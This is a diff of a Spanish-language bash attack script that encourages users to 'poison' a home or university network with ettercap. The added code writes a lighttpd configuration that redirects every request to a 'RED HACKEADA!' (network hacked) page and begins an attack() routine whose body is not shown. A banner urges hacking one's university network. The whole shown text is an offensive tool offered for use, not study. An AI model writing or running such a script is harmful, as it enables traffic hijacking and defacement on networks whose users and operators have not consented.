@@ -1,3 +1,59 @@
+#!/bin/bash
+
+####################
+#
+# Conquista tu red!
+#
+# Por Theblood!
+#
+##################################
+#
+# Envenena la red de tu hogar o Universidad con este script! 
+# basta con tener ettercap instalado en tu sistema para poder ejecutarlo 
+# correctamente todo lo demas *-* lo  hace este script ! <Theblood>!
+######################################################################################
+
+# Directorio temporal
+TMP="/tmp/theblood$$"
+
+# Creamos directorio
+mkdir -p "$TMP/www"
+
+# Crear archivo de configuración de lighhtpd
+makeconfig() {
+cat << EOF >"$TMP/lighttpd.cfg"
+# lighttpd configuration file
+server.modules       = ("mod_access","mod_accesslog","mod_rewrite","mod_redirect")
+index-file.names     = ( "index.html")
+mimetype.assign      = (".html" => "text/html")
+url.rewrite-once     = ("^/(.*)$" => "/index.html")
+url.redirect         = ("^/$" => "/index.html")
+server.errorlog      = "$TMP/lighttpd.log"
+server.document-root = "$TMP/www"
+server.pid-file      = "$TMP/lighttpd.pid"
+accesslog.filename   = "$TMP/lighttpd.log"
+EOF
+}
+
+
+# Crear el index por defecto
+makeindex() {
+cat << EOF >"$TMP/www/index.html"
+<html>
+  <head>
+    <title>ACCESO DENEGADO</title>
+  </head>
+  <body BGCOLOR="BLACK" TEXT="RED">
+    <table WIDTH="100%" HEIGHT="100%"><tr>
+      <td VALIGN="MIDDLE" ALIGN="CENTER">
+       <h1><b>RED HACKEADA!</b></h1>
+      </td></tr>
+    </table>  
+  </body>
+</html>
+EOF
+}
+
 # Ponemos en marcha el servidor y lanzamos el ataque
 attack() {
 echo ""
@@ -68,7 +124,7 @@ sleep 0.1s; echo " ####### #######     #####  #     # ####### #     # ######  ##
 sleep 0.1s; echo "                                                                        [0m"
 echo " ---------------------------------------------------------------------------
  [1;33mHackea la red  de tu universidad con este sencillo script 
-  by theblood , sigue los pasos para que todo resulte bien , ! 
+  solo debes tener ettercap instalado en tu computador ! 
   [0m
  --------------------------------------------------------------------------- "
 }
